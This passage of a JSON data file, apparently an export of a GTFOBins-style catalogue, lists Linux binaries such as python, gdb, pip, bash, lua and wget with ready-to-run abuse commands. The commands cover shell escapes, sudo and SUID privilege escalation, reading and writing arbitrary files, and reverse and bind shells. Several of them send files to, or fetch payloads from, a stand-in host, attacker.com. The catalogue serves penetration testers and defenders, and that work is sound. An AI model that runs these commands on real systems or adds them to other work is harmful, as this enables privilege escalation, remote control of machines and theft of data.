"awk", "function": "sudo", "data": [{"code": "sudo awk 'BEGIN {system(\"/bin/sh\")}'"}]}, "411": {"platform": "linux", "cmd": "awk", "function": "limited-suid", "data": [{"code": "./awk 'BEGIN {system(\"/bin/sh\")}'"}]}, "412": {"platform": "linux", "cmd": "paste", "function": "file-read", "data": [{"code": "LFILE=file_to_read\npaste $LFILE\n"}]}, "413": {"platform": "linux", "cmd": "paste", "function": "suid", "data": [{"code": "LFILE=file_to_read\npaste $LFILE\n"}]}, "414": {"platform": "linux", "cmd": "paste", "function": "sudo", "data": [{"code": "LFILE=file_to_read\nsudo paste $LFILE\n"}]}, "415": {"platform": "linux", "cmd": "wget", "function": "file-upload", "data": [{"description": "Send local file with an HTTP POST request. Run an HTTP service on the attacker box to collect the file. Note that the file will be sent as-is, instruct the service to not URL-decode the body. Use `--post-data` to send hard-coded data.", "code": "URL=http://attacker.com/\nLFILE=file_to_send\nwget --post-file=$LFILE $URL\n"}]}, "416": {"platform": "linux", "cmd": "wget", "function": "file-download", "data": [{"description": "Fetch a remote file via HTTP GET request.", "code": "URL=http://attacker.com/file_to_get\nLFILE=file_to_save\nwget $URL -O $LFILE\n"}]}, "417": {"platform": "linux", "cmd": "wget", "function": "suid", "data": [{"description": "Fetch a remote file via HTTP GET request.", "code": "URL=http://attacker.com/file_to_get\nLFILE=file_to_save\n./wget $URL -O $LFILE\n"}]}, "418": {"platform": "linux", "cmd": "wget", "function": "sudo", "data": [{"description": "Fetch a remote file via HTTP GET request.", "code": "URL=http://attacker.com/file_to_get\nLFILE=file_to_save\nsudo wget $URL -O $LFILE\n"}]}, "419": {"platform": "linux", "cmd": "cut", "function": "file-read", "data": [{"code": "LFILE=file_to_read\ncut -d \"\" -f1 \"$LFILE\"\n"}]}, "420": {"platform": "linux", "cmd": "cut", "function": "suid", "data": [{"code": "LFILE=file_to_read\n./cut -d \"\" -f1 \"$LFILE\"\n"}]}, "421": {"platform": "linux", "cmd": "cut", "function": "sudo", "data": [{"code": "LFILE=file_to_read\nsudo cut -d \"\" -f1 \"$LFILE\"\n"}]}, "422": {"platform": "linux", "cmd": "slsh", "function": "shell", "data": [{"code": "slsh -e 'system(\"/bin/sh\")'"}]}, "423": {"platform": "linux", "cmd": "slsh", "function": "sudo", "data": [{"code": "sudo slsh -e 'system(\"/bin/sh\")'"}]}, "424": {"platform": "linux", "cmd": "slsh", "function": "limited-suid", "data": [{"code": "./slsh -e 'system(\"/bin/sh\")'"}]}, "425": {"platform": "linux", "cmd": "python", "function": "shell", "data": [{"code": "python -c 'import os; os.system(\"/bin/sh\")'"}]}, "426": {"platform": "linux", "cmd": "python", "function": "reverse-shell", "data": [{"description": "Run ``socat file:`tty`,raw,echo=0 tcp-listen:12345`` on the attacker box to receive the shell.", "code": "export RHOST=attacker.com\nexport RPORT=12345\npython -c 'import sys,socket,os,pty;s=socket.socket()\ns.connect((os.getenv(\"RHOST\"),int(os.getenv(\"RPORT\"))))\n[os.dup2(s.fileno(),fd) for fd in (0,1,2)]\npty.spawn(\"/bin/sh\")'\n"}]}, "427": {"platform": "linux", "cmd": "python", "function": "file-upload", "data": [{"description": "Send local file via \"d\" parameter of a HTTP POST request. Run an HTTP service on the attacker box to collect the file.", "code": "export URL=http://attacker.com/\nexport LFILE=file_to_send\npython -c 'import sys; from os import environ as e\nif sys.version_info.major == 3: import urllib.request as r, urllib.parse as u\nelse: import urllib as u, urllib2 as r\nr.urlopen(e[\"URL\"], bytes(u.urlencode({\"d\":open(e[\"LFILE\"]).read()}).encode()))'\n"}, {"description": "Serve files in the local folder running an HTTP server.", "code": "export LPORT=8888\npython -c 'import sys; from os import environ as e\nif sys.version_info.major == 3: import http.server as s, socketserver as ss\nelse: import SimpleHTTPServer as s, SocketServer as ss\nss.TCPServer((\"\", int(e[\"LPORT\"])), s.SimpleHTTPRequestHandler).serve_forever()'\n"}]}, "428": {"platform": "linux", "cmd": "python", "function": "file-download", "data": [{"description": "Fetch a remote file via HTTP GET request.", "code": "export URL=http://attacker.com/file_to_get\nexport LFILE=file_to_save\npython -c 'import sys; from os import environ as e\nif sys.version_info.major == 3: import urllib.request as r\nelse: import urllib as r\nr.urlretrieve(e[\"URL\"], e[\"LFILE\"])'\n"}]}, "429": {"platform": "linux", "cmd": "python", "function": "file-write", "data": [{"code": "python -c 'open(\"file_to_write\",\"w+\").write(\"DATA\")'"}]}, "430": {"platform": "linux", "cmd": "python", "function": "file-read", "data": [{"code": "python -c 'print(open(\"file_to_read\").read())'"}]}, "431": {"platform": "linux", "cmd": "python", "function": "library-load", "data": [{"code": "python -c 'from ctypes import cdll; cdll.LoadLibrary(\"lib.so\")'"}]}, "432": {"platform": "linux", "cmd": "python", "function": "suid", "data": [{"code": "./python -c 'import os; os.execl(\"/bin/sh\", \"sh\", \"-p\")'"}]}, "433": {"platform": "linux", "cmd": "python", "function": "sudo", "data": [{"code": "sudo python -c 'import os; os.system(\"/bin/sh\")'"}]}, "434": {"platform": "linux", "cmd": "python", "function": "capabilities", "data": [{"code": "./python -c 'import os; os.setuid(0); os.system(\"/bin/sh\")'"}]}, "435": {"platform": "linux", "cmd": "systemctl", "function": "suid", "data": [{"code": "TF=$(mktemp).service\necho '[Service]\nType=oneshot\nExecStart=/bin/sh -c \"id > /tmp/output\"\n[Install]\nWantedBy=multi-user.target' > $TF\n./systemctl link $TF\n./systemctl enable --now $TF\n"}]}, "436": {"platform": "linux", "cmd": "systemctl", "function": "sudo", "data": [{"code": "TF=$(mktemp)\necho /bin/sh >$TF\nchmod +x $TF\nsudo SYSTEMD_EDITOR=$TF systemctl edit system.slice\n"}, {"code": "TF=$(mktemp).service\necho '[Service]\nType=oneshot\nExecStart=/bin/sh -c \"id > /tmp/output\"\n[Install]\nWantedBy=multi-user.target' > $TF\nsudo systemctl link $TF\nsudo systemctl enable --now $TF\n"}, {"description": "This invokes the default pager, which is likely to be [`less`](/gtfobins/less/), other functions may apply.", "code": "sudo systemctl\n!sh\n"}]}, "437": {"platform": "linux", "cmd": "csh", "function": "shell", "data": [{"code": "csh"}]}, "438": {"platform": "linux", "cmd": "csh", "function": "file-write", "data": [{"code": "export LFILE=file_to_write\nash -c 'echo DATA > $LFILE'\n"}]}, "439": {"platform": "linux", "cmd": "csh", "function": "suid", "data": [{"code": "./csh -b"}]}, "440": {"platform": "linux", "cmd": "csh", "function": "sudo", "data": [{"code": "sudo csh"}]}, "441": {"platform": "linux", "cmd": "cancel", "function": "file-upload", "data": [{"description": "Send local file using a TCP connection. Run `nc -l -p 12345 > \"file_to_save\"` on the attacker box to collect the file.", "code": "RHOST=attacker.com\nRPORT=12345\nLFILE=file_to_send\ncancel -u \"$(cat $LFILE)\" -h $RHOST:$RPORT\n"}]}, "442": {"platform": "linux", "cmd": "cat", "function": "file-read", "data": [{"code": "LFILE=file_to_read\ncat \"$LFILE\"\n"}]}, "443": {"platform": "linux", "cmd": "cat", "function": "suid", "data": [{"code": "LFILE=file_to_read\n./cat \"$LFILE\"\n"}]}, "444": {"platform": "linux", "cmd": "cat", "function": "sudo", "data": [{"code": "LFILE=file_to_read\nsudo cat \"$LFILE\"\n"}]}, "445": {"platform": "linux", "cmd": "ld.so", "function": "shell", "data": [{"code": "/lib/ld.so /bin/sh"}]}, "446": {"platform": "linux", "cmd": "ld.so", "function": "suid", "data": [{"code": "./ld.so /bin/sh -p"}]}, "447": {"platform": "linux", "cmd": "ld.so", "function": "sudo", "data": [{"code": "sudo /lib/ld.so /bin/sh"}]}, "448": {"platform": "linux", "cmd": "rsync", "function": "shell", "data": [{"code": "rsync -e 'sh -c \"sh 0<&2 1>&2\"' 127.0.0.1:/dev/null"}]}, "449": {"platform": "linux", "cmd": "rsync", "function": "sudo", "data": [{"code": "sudo rsync -e 'sh -c \"sh 0<&2 1>&2\"' 127.0.0.1:/dev/null"}]}, "450": {"platform": "linux", "cmd": "rsync", "function": "suid", "data": [{"code": "./rsync -e 'sh -p -c \"sh 0<&2 1>&2\"' 127.0.0.1:/dev/null"}]}, "451": {"platform": "linux", "cmd": "facter", "function": "shell", "data": [{"code": "TF=$(mktemp -d)\necho 'exec(\"/bin/sh\")' > $TF/x.rb\nFACTERLIB=$TF facter\n"}]}, "452": {"platform": "linux", "cmd": "facter", "function": "sudo", "data": [{"code": "TF=$(mktemp -d)\necho 'exec(\"/bin/sh\")' > $TF/x.rb\nsudo FACTERLIB=$TF facter\n"}]}, "453": {"platform": "linux", "cmd": "gdb", "function": "shell", "data": [{"code": "gdb -nx -ex '!sh' -ex quit"}]}, "454": {"platform": "linux", "cmd": "gdb", "function": "reverse-shell", "data": [{"description": "This requires that GDB is compiled with Python support. Run ``socat file:`tty`,raw,echo=0 tcp-listen:12345`` on the attacker box to receive the shell.", "code": "export RHOST=attacker.com\nexport RPORT=12345\ngdb -nx -ex 'python import sys,socket,os,pty;s=socket.socket()\ns.connect((os.getenv(\"RHOST\"),int(os.getenv(\"RPORT\"))))\n[os.dup2(s.fileno(),fd) for fd in (0,1,2)]\npty.spawn(\"/bin/sh\")' -ex quit\n"}]}, "455": {"platform": "linux", "cmd": "gdb", "function": "file-upload", "data": [{"description": "This requires that GDB is compiled with Python support. Send local file via \"d\" parameter of a HTTP POST request. Run an HTTP service on the attacker box to collect the file.", "code": "export URL=http://attacker.com/\nexport LFILE=file_to_send\ngdb -nx -ex 'python import sys; from os import environ as e\nif sys.version_info.major == 3: import urllib.request as r, urllib.parse as u\nelse: import urllib as u, urllib2 as r\nr.urlopen(e[\"URL\"], bytes(u.urlencode({\"d\":open(e[\"LFILE\"]).read()}).encode()))' -ex quit\n"}, {"description": "This requires that GDB is compiled with Python support. Serve files in the local folder running an HTTP server.", "code": "export LPORT=8888\ngdb -nx -ex 'python import sys; from os import environ as e\nif sys.version_info.major == 3: import http.server as s, socketserver as ss\nelse: import SimpleHTTPServer as s, SocketServer as ss\nss.TCPServer((\"\", int(e[\"LPORT\"])), s.SimpleHTTPRequestHandler).serve_forever()' -ex quit\n"}]}, "456": {"platform": "linux", "cmd": "gdb", "function": "file-download", "data": [{"description": "This requires that GDB is compiled with Python support. Fetch a remote file via HTTP GET request.", "code": "export URL=http://attacker.com/file_to_get\nexport LFILE=file_to_save\ngdb -nx -ex 'python import sys; from os import environ as e\nif sys.version_info.major == 3: import urllib.request as r\nelse: import urllib as r\nr.urlretrieve(e[\"URL\"], e[\"LFILE\"])' -ex quit\n"}]}, "457": {"platform": "linux", "cmd": "gdb", "function": "file-write", "data": [{"description": "This requires that GDB is compiled with Python support.", "code": "LFILE=file_to_write\ngdb -nx -ex \"dump value $LFILE \\\"DATA\\\"\" -ex quit\n"}]}, "458": {"platform": "linux", "cmd": "gdb", "function": "file-read", "data": [{"description": "This requires that GDB is compiled with Python support.", "code": "gdb -nx -ex 'python print(open(\"file_to_read\").read())' -ex quit"}]}, "459": {"platform": "linux", "cmd": "gdb", "function": "library-load", "data": [{"description": "This requires that GDB is compiled with Python support.", "code": "gdb -nx -ex 'python from ctypes import cdll; cdll.LoadLibrary(\"lib.so\")' -ex quit"}]}, "460": {"platform": "linux", "cmd": "gdb", "function": "suid", "data": [{"description": "This requires that GDB is compiled with Python support.", "code": "./gdb -nx -ex 'python import os; os.execl(\"/bin/sh\", \"sh\", \"-p\")' -ex quit"}]}, "461": {"platform": "linux", "cmd": "gdb", "function": "sudo", "data": [{"code": "sudo gdb -nx -ex '!sh' -ex quit"}]}, "462": {"platform": "linux", "cmd": "gdb", "function": "capabilities", "data": [{"description": "This requires that GDB is compiled with Python support.", "code": "./gdb -nx -ex 'python import os; os.setuid(0)' -ex '!sh' -ex quit"}]}, "463": {"platform": "linux", "cmd": "hping3", "function": "shell", "data": [{"code": "hping3\n/bin/sh\n"}]}, "464": {"platform": "linux", "cmd": "hping3", "function": "suid", "data": [{"code": "./hping3\n/bin/sh -p\n"}]}, "465": {"platform": "linux", "cmd": "hping3", "function": "sudo", "data": [{"code": "sudo hping3\n/bin/sh\n"}]}, "466": {"platform": "linux", "cmd": "cobc", "function": "shell", "data": [{"code": "TF=$(mktemp -d)\necho 'CALL \"SYSTEM\" USING \"/bin/sh\".' > $TF/x\ncobc -xFj --frelax-syntax-checks $TF/x\n"}]}, "467": {"platform": "linux", "cmd": "cobc", "function": "sudo", "data": [{"code": "TF=$(mktemp -d)\necho 'CALL \"SYSTEM\" USING \"/bin/sh\".' > $TF/x\nsudo cobc -xFj --frelax-syntax-checks $TF/x\n"}]}, "468": {"platform": "linux", "cmd": "dnf", "function": "sudo", "data": [{"description": "It runs commands using a specially crafted RPM package. Generate it with [fpm](https://github.com/jordansissel/fpm) and upload it to the target.\n```\nTF=$(mktemp -d)\necho 'id' > $TF/x.sh\nfpm -n x -s dir -t rpm -a all --before-install $TF/x.sh $TF\n```\n", "code": "sudo dnf install -y x-1.0-1.noarch.rpm\n"}]}, "469": {"platform": "linux", "cmd": "pip", "function": "shell", "data": [{"code": "TF=$(mktemp -d)\necho \"import os; os.execl('/bin/sh', 'sh', '-c', 'sh <$(tty) >$(tty) 2>$(tty)')\" > $TF/setup.py\npip install $TF\n"}]}, "470": {"platform": "linux", "cmd": "pip", "function": "reverse-shell", "data": [{"description": "Run ``socat file:`tty`,raw,echo=0 tcp-listen:12345`` on the attacker box to receive the shell.", "code": "export RHOST=attacker.com\nexport RPORT=12345\nTF=$(mktemp -d)\necho 'import sys,socket,os,pty;s=socket.socket()\ns.connect((os.getenv(\"RHOST\"),int(os.getenv(\"RPORT\"))))\n[os.dup2(s.fileno(),fd) for fd in (0,1,2)]\npty.spawn(\"/bin/sh\")' > $TF/setup.py\npip install $TF\n"}]}, "471": {"platform": "linux", "cmd": "pip", "function": "file-upload", "data": [{"description": "Send local file via \"d\" parameter of a HTTP POST request. Run an HTTP service on the attacker box to collect the file.", "code": "export URL=http://attacker.com/\nexport LFILE=file_to_send\nTF=$(mktemp -d)\necho 'import sys; from os import environ as e\nif sys.version_info.major == 3: import urllib.request as r, urllib.parse as u\nelse: import urllib as u, urllib2 as r\nr.urlopen(e[\"URL\"], bytes(u.urlencode({\"d\":open(e[\"LFILE\"]).read()}).encode()))' > $TF/setup.py\npip install $TF\n"}, {"description": "Serve files in the local folder running an HTTP server.", "code": "export LPORT=8888\nTF=$(mktemp -d)\necho 'import sys; from os import environ as e\nif sys.version_info.major == 3: import http.server as s, socketserver as ss\nelse: import SimpleHTTPServer as s, SocketServer as ss\nss.TCPServer((\"\", int(e[\"LPORT\"])), s.SimpleHTTPRequestHandler).serve_forever()' > $TF/setup.py\npip install $TF\n"}]}, "472": {"platform": "linux", "cmd": "pip", "function": "file-download", "data": [{"description": "Fetch a remote file via HTTP GET request. It needs an absolute local file path.", "code": "export URL=http://attacker.com/file_to_get\nexport LFILE=/tmp/file_to_save\nTF=$(mktemp -d)\necho 'import sys; from os import environ as e\nif sys.version_info.major == 3: import urllib.request as r\nelse: import urllib as r\nr.urlretrieve(e[\"URL\"], e[\"LFILE\"])' > $TF/setup.py\npip install $TF\n"}]}, "473": {"platform": "linux", "cmd": "pip", "function": "file-write", "data": [{"description": "It needs an absolute local file path.", "code": "export LFILE=/tmp/file_to_save\nTF=$(mktemp -d)\necho \"open('$LFILE','w+').write('DATA')\" > $TF/setup.py\npip install $TF\n"}]}, "474": {"platform": "linux", "cmd": "pip", "function": "file-read", "data": [{"description": "The read file content is corrupted as wrapped within an exception error.", "code": "TF=$(mktemp -d)\necho 'raise Exception(open(\"file_to_read\").read())' > $TF/setup.py\npip install $TF\n"}]}, "475": {"platform": "linux", "cmd": "pip", "function": "library-load", "data": [{"code": "TF=$(mktemp -d)\necho 'from ctypes import cdll; cdll.LoadLibrary(\"lib.so\")' > $TF/setup.py\npip install $TF\n"}]}, "476": {"platform": "linux", "cmd": "pip", "function": "sudo", "data": [{"code": "TF=$(mktemp -d)\necho \"import os; os.execl('/bin/sh', 'sh', '-c', 'sh <$(tty) >$(tty) 2>$(tty)')\" > $TF/setup.py\nsudo pip install $TF\n"}]}, "477": {"platform": "linux", "cmd": "jq", "function": "file-read", "data": [{"code": "LFILE=file_to_read\njq -Rr . \"$LFILE\"\n"}]}, "478": {"platform": "linux", "cmd": "jq", "function": "suid", "data": [{"code": "LFILE=file_to_read\n./jq -Rr . \"$LFILE\"\n"}]}, "479": {"platform": "linux", "cmd": "jq", "function": "sudo", "data": [{"code": "LFILE=file_to_read\nsudo jq -Rr . \"$LFILE\"\n"}]}, "480": {"platform": "linux", "cmd": "chmod", "function": "suid", "data": [{"code": "LFILE=file_to_change\n./chmod 6777 $LFILE\n"}]}, "481": {"platform": "linux", "cmd": "chmod", "function": "sudo", "data": [{"code": "LFILE=file_to_change\nsudo chmod 6777 $LFILE\n"}]}, "482": {"platform": "linux", "cmd": "tbl", "function": "file-read", "data": [{"code": "LFILE=file_to_read\ntbl $LFILE\n"}]}, "483": {"platform": "linux", "cmd": "tbl", "function": "suid", "data": [{"code": "LFILE=file_to_read\n./tbl $LFILE\n"}]}, "484": {"platform": "linux", "cmd": "tbl", "function": "sudo", "data": [{"code": "LFILE=file_to_read\nsudo tbl $LFILE\n"}]}, "485": {"platform": "linux", "cmd": "bash", "function": "shell", "data": [{"code": "bash"}]}, "486": {"platform": "linux", "cmd": "bash", "function": "reverse-shell", "data": [{"description": "Run `nc -l -p 12345` on the attacker box to receive the shell.", "code": "export RHOST=attacker.com\nexport RPORT=12345\nbash -c 'exec bash -i &>/dev/tcp/$RHOST/$RPORT <&1'\n"}]}, "487": {"platform": "linux", "cmd": "bash", "function": "file-upload", "data": [{"description": "Send local file in the body of an HTTP POST request. Run an HTTP service on the attacker box to collect the file.", "code": "export RHOST=attacker.com\nexport RPORT=12345\nexport LFILE=file_to_send\nbash -c 'echo -e \"POST / HTTP/0.9\\n\\n$(<$LFILE)\" > /dev/tcp/$RHOST/$RPORT'\n"}, {"description": "Send local file using a TCP connection. Run `nc -l -p 12345 > \"file_to_save\"` on the attacker box to collect the file.", "code": "export RHOST=attacker.com\nexport RPORT=12345\nexport LFILE=file_to_send\nbash -c 'cat $LFILE > /dev/tcp/$RHOST/$RPORT'\n"}]}, "488": {"platform": "linux", "cmd": "bash", "function": "file-download", "data": [{"description": "Fetch a remote file via HTTP GET request.", "code": "export RHOST=attacker.com\nexport RPORT=12345\nexport LFILE=file_to_get\nbash -c '{ echo -ne \"GET /$LFILE HTTP/1.0\\r\\nhost: $RHOST\\r\\n\\r\\n\" 1>&3; cat 0<&3; } \\\n    3<>/dev/tcp/$RHOST/$RPORT \\\n    | { while read -r; do [ \"$REPLY\" = \"$(echo -ne \"\\r\")\" ] && break; done; cat; } > $LFILE'\n"}, {"description": "Fetch remote file using a TCP connection. Run `nc -l -p 12345 < \"file_to_send\"` on the attacker box to send the file.", "code": "export RHOST=attacker.com\nexport RPORT=12345\nexport LFILE=file_to_get\nbash -c 'cat < /dev/tcp/$RHOST/$RPORT > $LFILE'\n"}]}, "489": {"platform": "linux", "cmd": "bash", "function": "file-write", "data": [{"code": "export LFILE=file_to_write\nbash -c 'echo DATA > $LFILE'\n"}, {"description": "This adds timestamps to the output file.", "code": "LFILE=file_to_write\nHISTIGNORE='history *'\nhistory -c\nDATA\nhistory -w $LFILE\n"}]}, "490": {"platform": "linux", "cmd": "bash", "function": "file-read", "data": [{"description": "It trims trailing newlines and it's not binary-safe.", "code": "export LFILE=file_to_read\nbash -c 'echo \"$(<$LFILE)\"'\n"}, {"description": "The read file content is surrounded by the current history content.", "code": "LFILE=file_to_read\nHISTTIMEFORMAT=$'\\r\\e[K'\nhistory -r $LFILE\nhistory\n"}]}, "491": {"platform": "linux", "cmd": "bash", "function": "library-load", "data": [{"code": "bash -c 'enable -f ./lib.so x'"}]}, "492": {"platform": "linux", "cmd": "bash", "function": "suid", "data": [{"code": "./bash -p"}]}, "493": {"platform": "linux", "cmd": "bash", "function": "sudo", "data": [{"code": "sudo bash"}]}, "494": {"platform": "linux", "cmd": "xelatex", "function": "shell", "data": [{"code": "xelatex --shell-escape '\\documentclass{article}\\begin{document}\\immediate\\write18{/bin/sh}\\end{document}'\n"}]}, "495": {"platform": "linux", "cmd": "xelatex", "function": "file-read", "data": [{"description": "The read file will be part of the output.", "code": "xelatex '\\documentclass{article}\\usepackage{verbatim}\\begin{document}\\verbatiminput{file_to_read}\\end{document}'\nstrings article.dvi\n"}]}, "496": {"platform": "linux", "cmd": "xelatex", "function": "sudo", "data": [{"description": "The read file will be part of the output.", "code": "sudo xelatex '\\documentclass{article}\\usepackage{verbatim}\\begin{document}\\verbatiminput{file_to_read}\\end{document}'\nstrings article.dvi\n"}, {"code": "sudo xelatex --shell-escape '\\documentclass{article}\\begin{document}\\immediate\\write18{/bin/sh}\\end{document}'\n"}]}, "497": {"platform": "linux", "cmd": "xelatex", "function": "limited-suid", "data": [{"code": "./xelatex --shell-escape '\\documentclass{article}\\begin{document}\\immediate\\write18{/bin/sh}\\end{document}'\n"}]}, "498": {"platform": "linux", "cmd": "lua", "function": "shell", "data": [{"code": "lua -e 'os.execute(\"/bin/sh\")'"}]}, "499": {"platform": "linux", "cmd": "lua", "function": "non-interactive-reverse-shell", "data": [{"description": "Run ``nc -l -p 12345`` on the attacker box to receive the shell. This requires `lua-socket` installed.", "code": "export RHOST=attacker.com\nexport RPORT=12345\nlua -e 'local s=require(\"socket\");\n  local t=assert(s.tcp());\n  t:connect(os.getenv(\"RHOST\"),os.getenv(\"RPORT\"));\n  while true do\n    local r,x=t:receive();local f=assert(io.popen(r,\"r\"));\n    local b=assert(f:read(\"*a\"));t:send(b);\n  end;\n  f:close();t:close();'\n"}]}, "500": {"platform": "linux", "cmd": "lua", "function": "non-interactive-bind-shell", "data": [{"description": "Run `nc target.com 12345` on the attacker box to connect to the shell. This requires `lua-socket` installed.", "code": "export LPORT=12345\nlua -e 'local k=require(\"socket\");\n  local s=assert(k.bind(\"*\",os.getenv(\"LPORT\")));\n  local c=s:accept();\n  while true do\n    local r,x=c:receive();local f=assert(io.popen(r,\"r\"));\n    local b=assert(f:read(\"*a\"));c:send(b);\n  end;c:close();f:close();'\n"}]}, "501": {"platform": "linux", "cmd": "lua", "function": "file-upload", "data": [{"description": "Send a local file via TCP. Run `nc -l -p 12345 > \"file_to_save\"` on the attacker box to collect the file. This requires `lua-socket` installed.", "code": "RHOST=attacker.com\nRPORT=12345\nLFILE=file_to_send\nlua -e '\n  local f=io.open(os.getenv(\"LFILE\"), 'rb')\n  local d=f:read(\"*a\")\n  io.close(f);\n  local s=require(\"socket\");\n  local t=assert(s.tcp());\n  t:connect(os.getenv(\"RHOST\"),os.getenv(\"RPORT\"));\n  t:send(d);\n  t:close();'\n"}]}, "502": {"platform": "linux", "cmd": "lua", "function": "file-download", "data": [{"description": "Fetch a remote file via TCP. Run `nc target.com 12345 < \"file_to_send\"` on the attacker box to send the file. This requires `lua-socket` installed.", "code": "export LPORT=12345\nexport LFILE=file_to_save\nlua -e 'local k=require(\"socket\");\n  local s=assert(k.bind(\"*\",os.getenv(\"LPORT\")));\n  local c=s:accept();\n  local d,x=c:receive(\"*a\");\n  c:close();\n  local f=io.open(os.getenv(\"LFILE\"), \"wb\");\n  f:write(d);\n  io.close(f);'\n"}]}, "503": {"platform": "linux", "cmd": "lua", "function": "file-write", "data": [{"code": "lua -e 'local f=io.open(\"file_to_write\", \"wb\"); f:write(\"DATA\"); io.close(f);'"}]}, "504": {"platform": "linux", "cmd": "lua", "function": "file-read", "data": [{"code": "lua -e 'local f=io.open(\"file_to_read\", \"rb\"); print(f:read(\"*a\")); io.close(f);'"}]}, "505": {"platform": "linux", "cmd": "lua", "function": "suid", "data": [{"code": "lua -e 'local f=io.open(\"file_to_read\", \"rb\"); print(f:read(\"*a\")); io.close(f);'"}]}, "506": {"platform": "linux", "cmd": "lua", "function": "sudo", "data": [{"code": "sudo lua -e 'os.execute(\"/bin/sh\")'"}]}, "507": {"platform": "linux", "cmd": "lua", "function": "limited-suid", "data": [{"code": "./lua -e 'os.execute(\"/bin/sh\")'"}]}, "508": {"platform": "linux", "cmd": "screen", "function": "shell", "data": [{"code": "screen"}]}, "509": {"platform": "linux", "cmd": "screen", "function": "file-write", "data": [{"description": "This works on screen version 4.06.02. Data is appended to the file and `\\n` is converted to `\\r\\n`.", "code": "LFILE=file_to_write\nscreen -L -Logfile $LFILE echo DATA\n"}, {"description": "This works on screen version 4.05.00. Data is appended to the file and `\\n` is converted to `\\r\\n`.", "code": "LFILE=file_to_write\nscreen -L $LFILE echo DATA\n"}]}, "510": {"platform": "linux", "cmd": "screen", "function": "sudo", "data": [{"code": "sudo screen"}]}, "511": {"platform": "linux", "cmd": "tac", "function": "file-read", "data": [{"code": "LFILE=file_to_read\ntac -s 'RANDOM' \"$LFILE\"\n"}]}, "512": {"platform": "linux", "cmd": "tac", "function": "suid", "data": [{"code": "LFILE=file_to_read\n./tac -s 'RANDOM' \"$LFILE\"\n"}]}, "513": {"platform": "linux", "cmd": "tac", "function": "sudo", "data": [{"code": "LFILE=file_to_read\nsudo tac -s 'RANDOM' \"$LFILE\"\n"}]}, "514": {"platform": "linux", "cmd": "wc", "function": "file-read", "data": [{"code": "LFILE=file_to_read\nwc --files0-from \"$LFILE\"\n"}]}, "515": {"platform": "linux", "cmd": "wc", "function": "suid", "data": [{"code": "LFILE=file_to_read\n./wc --files0-from \"$LFILE\"\n"}]}, "516": {"platform": "linux", "cmd": "wc", "function": "sudo", "data": [{"code": "LFILE=file_to_read\nsudo wc --files0-from \"$LFILE\"\n"}]}, "517": {"platform": "linux", "cmd": "uuencode", "function": "file-read", "data": [{"code": "LFILE=file_to_read\nuuencode \"$LFILE\" /dev/stdout | uudecode\n"}]}, "518": {"platform": "linux", "cmd": "uuencode", "function": "suid", "data": [{"code": "LFILE=file_to_read\nuuencode \"$LFILE\" /dev/stdout | uudecode\n"}]}, "519": {"platform": "linux", "cmd": "uuencode", "function": "sudo", "data": [{"code": "LFILE=file_to_read\nsudo uuencode \"$LFILE\" /dev/stdout | uudecode\n"}]}, "520": {"platform": "linux", "cmd": "update-alternatives", "function": "sudo", "data": [{"description": "Write in `$LFILE` a symlink to `$TF`.", "code": "LFILE=/path/to/file_to_write\nTF=$(mktemp)\necho DATA >$TF\nsudo update-alternatives --force --install \"$LFILE\" x \"$TF\" 0\n"}]}, "521": {"platform": "linux", "cmd": "update-alternatives", "function": "suid", "data": [{"description": "Write in `$LFILE` a symlink to `$TF`.", "code": "LFILE=/path/to/file_to_write\nTF=$(mktemp)\necho DATA >$TF\n./update-alternatives --force --install \"$LFILE\" x \"$TF\" 0\n"}]}, "522": {"platform": "linux", "cmd": "check_log", "function": "file-read", "data": [{"code": "LFILE=file_to_read\nOUTPUT=output_file\ncheck_log -F $LFILE -O $OUTPUT\ncat $OUTPUT\n"}]}, "523": {"platform": "linux", "cmd": "check_log", "function": "file-write", "data": [{"code": "LFILE=file_to_write\nINPUT=input_file\ncheck_log -F $INPUT -O $LFILE\n"}]}, "524": {"platform": "linux", "cmd": "check_log", "function": "sudo", "data": [{"code": "LFILE=file_to_write\nINPUT=input_file\nsudo check_log -F $INPUT -O $LFILE\n"}]}, "525": {"platform": "linux", "cmd": "gcc", "function": "file-read", "data": [{"code": "LFILE=file_to_read\ngcc -x c -E \"$LFILE\"\n"}]}, "526": {"platform": "linux", "cmd": "gcc", "function": "file-write", "data": [{"code": "LFILE=file_to_delete\ngcc -xc /dev/null -o $LFILE\n"}]}, "527": {"platform": "linux", "cmd": "gcc", "function": "shell", "data": [{"code": "gcc -wrapper /bin/sh,-s ."}]}, "528": {"platform": "linux", "cmd": "gcc", "function": "sudo", "data": [{"code": "sudo gcc -wrapper /bin/sh,-s ."}]}, "529": {"platform": "linux", "cmd": "view", "function": "shell", "data": [{"code": "view -c ':!/bin/sh'"}, {"code": "view\n:set shell=/bin/sh\n:shell\n"}, {"description": "This requires that `view` is compiled with Python support. Prepend `:py3` for Python 3.", "code": "view -c ':py import os; os.execl(\"/bin/sh\", \"sh\", \"-c\", \"reset; exec sh\")'"}, {"description": "This requires that `view` is compiled with Lua support.", "code": "view -c ':lua os.execute(\"reset; exec sh\")'"}]}, "530": {"platform": "linux", "cmd": "view", "function": "reverse-shell", "data": [{"description": "This requires that `view` is compiled with Python support. Prepend `:py3` for Python 3. Run ``socat file:`tty`,raw,echo=0 tcp-listen:12345`` on the attacker box to receive the shell.", "code": "export RHOST=attacker.com\nexport RPORT=12345\nview -c ':py import vim,sys,socket,os,pty;s=socket.socket()\ns.connect((os.getenv(\"RHOST\"),int(os.getenv(\"RPORT\"))))\n[os.dup2(s.fileno(),fd) for fd in (0,1,2)]\npty.spawn(\"/bin/sh\")\nvim.command(\":q!\")'\n"}]}, "531": {"platform": "linux", "cmd": "view", "function": "non-interactive-reverse-shell", "data": [{"description": "Run ``nc -l -p 12345`` on the attacker box to receive the shell. This requires that `view` is compiled with Lua support and that `lua-socket` is installed.", "code": "export RHOST=attacker.com\nexport RPORT=12345\nview -c ':lua local s=require(\"socket\"); local t=assert(s.tcp());\n  t:connect(os.getenv(\"RHOST\"),os.getenv(\"RPORT\"));\n  while true do\n    local r,x=t:receive();local f=assert(io.popen(r,\"r\"));\n    local b=assert(f:read(\"*a\"));t:send(b);\n  end;\n  f:close();t:close();'\n"}]}, "532": {"platform": "linux", "cmd": "view", "function": "non-interactive-bind-shell", "data": [{"description": "Run `nc target.com 12345` on the attacker box to connect to the shell. This requires that `view` is compiled with Lua support and that `lua-socket` is installed.", "code": "export LPORT=12345\nview -c ':lua local k=require(\"socket\");\n  local s=assert(k.bind(\"*\",os.getenv(\"LPORT\")));\n  local c=s:accept();\n  while true do\n    local r,x=c:receive();local f=assert(io.popen(r,\"r\"));\n    local 